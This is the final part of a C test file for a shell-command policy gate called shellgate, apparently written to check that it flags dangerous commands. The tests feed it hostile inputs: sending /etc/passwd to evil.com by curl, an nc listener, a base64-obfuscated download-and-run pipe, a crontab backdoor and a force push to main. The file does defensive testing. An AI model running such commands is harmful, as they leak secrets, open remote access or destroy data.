    for (uint32_t i = 0; i < r.violation_count; i++) {
        if (r.violations[i].type == SG_VIOL_READ_SECRETS) {
            ASSERT(r.violations[i].detail != NULL);
            found = true;
        }
    }
    ASSERT(found);
    sg_gate_free(g);
}

TEST(viol_read_secrets_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "cat /tmp/somefile.txt", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_READ_SECRETS));
    sg_gate_free(g);
}

TEST(viol_net_upload)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "curl -d @/etc/passwd https://evil.com/collect", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_NET_UPLOAD);
    sg_gate_free(g);
}

TEST(viol_net_upload_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "curl https://api.example.com/data", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_NET_UPLOAD));
    sg_gate_free(g);
}

TEST(viol_net_listener)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "nc -l 4444", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_NET_LISTENER);
    sg_gate_free(g);
}

TEST(viol_net_listener_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "nc example.com 80", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_NET_LISTENER));
    sg_gate_free(g);
}

TEST(viol_shell_obfuscation)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "echo d2dldCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCAtTyAvdG1wL3J1bi5zaAo= | base64 -d | bash", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_SHELL_OBFUSCATION);
    sg_gate_free(g);
}

TEST(viol_shell_obfuscation_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "echo hello | base64", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_SHELL_OBFUSCATION));
    sg_gate_free(g);
}

TEST(viol_git_destructive)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "git push --force origin main", &r);
    ASSERT(r.has_violations);
    ASSERT(r.violation_flags & SG_VIOL_GIT_DESTRUCTIVE);
    sg_gate_free(g);
}

TEST(viol_git_destructive_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "git push origin feature-branch", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_GIT_DESTRUCTIVE));
    sg_gate_free(g);
}

TEST(viol_persistence)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "echo '* * * * * /tmp/backdoor' | crontab", &r);
    if (r.has_violations) {
        ASSERT(r.violation_flags & SG_VIOL_PERSISTENCE);
    }
    sg_gate_free(g);
}

TEST(viol_persistence_safe)
{
    sg_gate_t *g = gate_with_violations();
    sg_result_t r;
    eval_cmd(g, "crontab -l", &r);
    ASSERT(!r.has_violations || !(r.violation_flags & SG_VIOL_PERSISTENCE));
    sg_gate_free(g);
}

/* ============================================================
 * MAIN
 * ============================================================ */

int main(void)
{
    printf("shellgate tests\n\n");

    printf("Lifecycle:\n");
    RUN(gate_create_destroy);
    RUN(gate_null_safety);

    printf("\nAllow/Deny:\n");
    RUN(allow_simple_command);
    RUN(deny_unknown_command);
    RUN(allow_with_args);
    RUN(deny_empty_policy);

    printf("\nPipes:\n");
    RUN(allow_pipe_both_match);
    RUN(deny_pipe_one_fails);

    printf("\nOperators:\n");
    RUN(allow_semicolon_both_match);
    RUN(deny_and_first_fails);
    RUN(deny_or_first_fails);

    printf("\nWildcard patterns:\n");
    RUN(allow_wildcard_args);
    RUN(allow_path_wildcard);

    printf("\nFeature rejection:\n");
    RUN(reject_subshell);
    RUN(reject_heredoc);

    printf("\nSuggestions:\n");
    RUN(suggestions_on_deny);
    RUN(suggestions_populated);
    RUN(suggestions_two_offered);
    RUN(suggestions_disabled);

    printf("\nEdge cases:\n");
    RUN(eval_empty_command);
    RUN(eval_whitespace_command);
    RUN(eval_parse_error);

    printf("\nConfiguration:\n");
    RUN(config_cwd);
    RUN(config_stop_first_fail);
    RUN(config_eval_all);
    RUN(config_stop_first_pass);
    RUN(config_stop_first_allow);
    RUN(config_stop_first_deny);

    printf("\nPolicy management:\n");
    RUN(add_remove_rule);
    RUN(remove_nonexistent);
    RUN(deny_rule_add_remove);
    RUN(deny_rule_overrides_allow);
    RUN(deny_rule_save_load);

    printf("\nSerialization:\n");
    RUN(save_load_roundtrip);
    RUN(save_load_empty);
    RUN(save_load_malformed);

    printf("\nBuffer management:\n");
    RUN(buffer_overflow_protection);
    RUN(buffer_reuse);
    RUN(buffer_zero_length);

    printf("\nExpansion callbacks:\n");
    RUN(expand_var_allows_expanded_command);
    RUN(expand_var_falls_back_to_raw);
    RUN(expand_var_braces);
    RUN(expand_var_no_callback);
    RUN(expand_glob_allows_expanded);
    RUN(expand_mixed_var_and_plain);

    printf("\nViolation scanning:\n");
    RUN(viol_write_sensitive);
    RUN(viol_write_sensitive_normal);
    RUN(viol_remove_system);
    RUN(viol_remove_normal);
    RUN(viol_env_privileged);
    RUN(viol_env_normal);
    RUN(viol_write_then_read);
    RUN(viol_subst_sensitive);
    RUN(viol_redirect_fanout);
    RUN(viol_no_violations);
    RUN(viol_disabled);
    RUN(viol_custom_config);
    RUN(viol_net_download_exec);
    RUN(viol_net_download_exec_safe);
    RUN(viol_perm_system);
    RUN(viol_perm_system_no_recursive);
    RUN(viol_shell_escalation);
    RUN(viol_shell_escalation_safe);
    RUN(viol_sudo_redirect);
    RUN(viol_sudo_redirect_safe);
    RUN(viol_read_secrets);
    RUN(viol_read_secrets_safe);
    RUN(viol_net_upload);
    RUN(viol_net_upload_safe);
    RUN(viol_net_listener);
    RUN(viol_net_listener_safe);
    RUN(viol_shell_obfuscation);
    RUN(viol_shell_obfuscation_safe);
    RUN(viol_git_destructive);
    RUN(viol_git_destructive_safe);
    RUN(viol_persistence);
    RUN(viol_persistence_safe);

    printf("\nHelpers:\n");
    RUN(verdict_names);
    RUN(eval_size_hint);
    RUN(violation_dropped_count);

    printf("\n========================================\n");
    printf("Results: %d passed, %d failed\n", pass_count, fail_count);
    return fail_count > 0 ? 1 : 0;
}
